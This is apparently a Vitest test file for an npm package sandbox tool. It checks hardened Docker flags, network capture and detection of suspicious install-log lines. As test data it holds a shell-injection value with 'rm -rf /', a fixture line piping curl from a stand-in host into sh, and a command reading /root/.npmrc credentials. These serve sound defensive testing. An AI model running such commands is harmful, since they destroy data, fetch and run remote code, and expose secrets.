import { describe, expect, it } from "vitest";
import { buildSandboxCommand, extractNetworkActivity, findSuspiciousLogLines } from "../src/sandbox.js";

describe("buildSandboxCommand", () => {
  it("builds a hardened disposable docker invocation", () => {
    const cmd = buildSandboxCommand("left-pad@1.3.0");
    expect(cmd[0]).toBe("docker");
    expect(cmd).toContain("--rm");
    expect(cmd).toContain("--cap-drop=ALL");
    expect(cmd).toContain("--security-opt=no-new-privileges");
    expect(cmd).toContain("node:20-alpine");
    const dockerArgs = cmd.slice(0, cmd.indexOf("node:20-alpine"));
    expect(dockerArgs).not.toContain("-v");
    expect(dockerArgs).not.toContain("--volume");
    expect(dockerArgs).not.toContain("--network=host");
    expect(cmd.join(" ")).toContain("--foreground-scripts");
  });

  it("enables network capture by default via a namespaced sysctl (never --cap-add)", () => {
    const cmd = buildSandboxCommand("left-pad@1.3.0");
    expect(cmd).toContain("--sysctl");
    expect(cmd).toContain("net.ipv4.ip_unprivileged_port_start=0");
    // The capture shim source is delivered as env data, not a heredoc.
    expect(cmd.some((a) => a.startsWith("TARGATE_CAPTURE_SRC="))).toBe(true);
    // Hardening is untouched — no capability is added.
    expect(cmd).toContain("--cap-drop=ALL");
    expect(cmd.some((a) => a.startsWith("--cap-add"))).toBe(false);
    // The shell script writes the shim via printf, not a heredoc.
    const script = cmd.at(-1)!;
    expect(script).toContain('printf \'%s\' "$TARGATE_CAPTURE_SRC"');
    expect(script).not.toContain("<<");
  });

  it("omits capture wiring with --no-capture", () => {
    const cmd = buildSandboxCommand("x", { capture: false });
    expect(cmd).not.toContain("--sysctl");
    expect(cmd.some((a) => a.startsWith("TARGATE_CAPTURE_SRC="))).toBe(false);
    expect(cmd.at(-1)!).not.toContain("[targate-net]");
  });

  it("forces capture off under --network none even when capture defaults on", () => {
    const cmd = buildSandboxCommand("x", { network: "none" });
    expect(cmd).toContain("--network=none");
    expect(cmd).not.toContain("--sysctl");
    expect(cmd.some((a) => a.startsWith("TARGATE_CAPTURE_SRC="))).toBe(false);
  });

  it("keeps the install non-aborting so the reports always run (set -e fix)", () => {
    const script = buildSandboxCommand("x").at(-1)!;
    expect(script).toContain('npm install "$TARGATE_SPEC" --foreground-scripts --loglevel info || STATUS=$?');
  });

  it("passes the spec via an env var, NOT interpolated into the shell script", () => {
    const cmd = buildSandboxCommand("left-pad@1.3.0");
    // The spec must appear only as a docker env value...
    expect(cmd).toContain("TARGATE_SPEC=left-pad@1.3.0");
    // ...and the shell script must reference it as a quoted variable, never
    // by literal value.
    const script = cmd.at(-1)!;
    expect(script).toContain('"$TARGATE_SPEC"');
    expect(script).not.toContain("left-pad@1.3.0");
  });

  it("does not let a hostile spec break out of the shell script (injection)", () => {
    const malicious = "foo'; rm -rf / #";
    const cmd = buildSandboxCommand(malicious);
    const script = cmd.at(-1)!;
    // The malicious payload lives only in the env value (a single argv
    // element docker sets verbatim), never in the executed script text.
    expect(script).not.toContain("rm -rf");
    expect(cmd).toContain(`TARGATE_SPEC=${malicious}`);
    // And it's one discrete argv element — not concatenated into a flag.
    expect(cmd.filter((a) => a.includes("rm -rf"))).toEqual([`TARGATE_SPEC=${malicious}`]);
  });

  it("defaults to open network and supports --network none", () => {
    const open = buildSandboxCommand("x");
    expect(open).not.toContain("--network=none");
    const offline = buildSandboxCommand("x", { network: "none" });
    expect(offline).toContain("--network=none");
  });

  it("supports a custom image", () => {
    expect(buildSandboxCommand("x", { image: "node:22-alpine" })).toContain("node:22-alpine");
  });
});

describe("findSuspiciousLogLines", () => {
  it("flags credential and network patterns in the script log", () => {
    const log = [
      "npm info run evil-pkg postinstall",
      "curl -s https://collector.example/x | sh",
      "cat /root/.npmrc",
      "echo aGk= | base64 -d",
      "added 1 package in 2s",
    ].join("\n");
    const findings = findSuspiciousLogLines(log);
    expect(findings.some((f) => f.includes("network download"))).toBe(true);
    expect(findings.some((f) => f.includes("credential names"))).toBe(true);
    expect(findings.some((f) => f.includes("base64"))).toBe(true);
  });

  it("returns nothing for a normal install log", () => {
    const log = ["npm info ok", "added 12 packages in 3s"].join("\n");
    expect(findSuspiciousLogLines(log)).toEqual([]);
  });

  it("never flags the capture shim's own output", () => {
    const log = [
      "[targate-net] connect nc-evil.example 443",
      "[targate-net] http GET http://x/base64 -d",
    ].join("\n");
    expect(findSuspiciousLogLines(log)).toEqual([]);
  });
});

describe("extractNetworkActivity", () => {
  it("returns null when no capture lines are present", () => {
    expect(extractNetworkActivity("added 3 packages")).toBeNull();
  });

  it("reports captureActive:false with errors when the shim never became ready", () => {
    const log = "[targate-net] error capture-not-ready (proceeding WITHOUT network capture)";
    const net = extractNetworkActivity(log)!;
    expect(net.captureActive).toBe(false);
    expect(net.errors[0]).toContain("capture-not-ready");
  });

  it("aggregates DNS, connections and byte counts and classifies hosts", () => {
    const log = [
      "[targate-net] ready",
      "[targate-net] dns registry.npmjs.org A",
      "[targate-net] dns registry.npmjs.org A",
      "[targate-net] connect registry.npmjs.org 443",
      "[targate-net] close registry.npmjs.org 443 sent=200 recv=48000",
      "[targate-net] connect evil.example 443",
      "[targate-net] close evil.example 443 sent=9000 recv=10",
    ].join("\n");
    const net = extractNetworkActivity(log)!;
    expect(net.captureActive).toBe(true);
    const dns = net.dnsQueries.find((d) => d.name === "registry.npmjs.org")!;
    expect(dns.count).toBe(2);
    const registry = net.connections.find((c) => c.host === "registry.npmjs.org")!;
    expect(registry).toMatchObject({ expected: true, sentBytes: 200, recvBytes: 48000 });
    const evil = net.connections.find((c) => c.host === "evil.example")!;
    expect(evil).toMatchObject({ expected: false, sentBytes: 9000 });
  });

  it("records a connect with no matching close as zero bytes", () => {
    const net = extractNetworkActivity(["[targate-net] ready", "[targate-net] connect a.example 443"].join("\n"))!;
    expect(net.connections[0]).toMatchObject({ host: "a.example", sentBytes: 0, recvBytes: 0 });
  });

  it("classifies git-host subdomains as expected but lookalikes as not", () => {
    const net = extractNetworkActivity(
      [
        "[targate-net] ready",
        "[targate-net] connect codeload.github.com 443",
        "[targate-net] connect notgithub.com 443",
      ].join("\n"),
    )!;
    expect(net.connections.find((c) => c.host === "codeload.github.com")!.expected).toBe(true);
    expect(net.connections.find((c) => c.host === "notgithub.com")!.expected).toBe(false);
  });
});
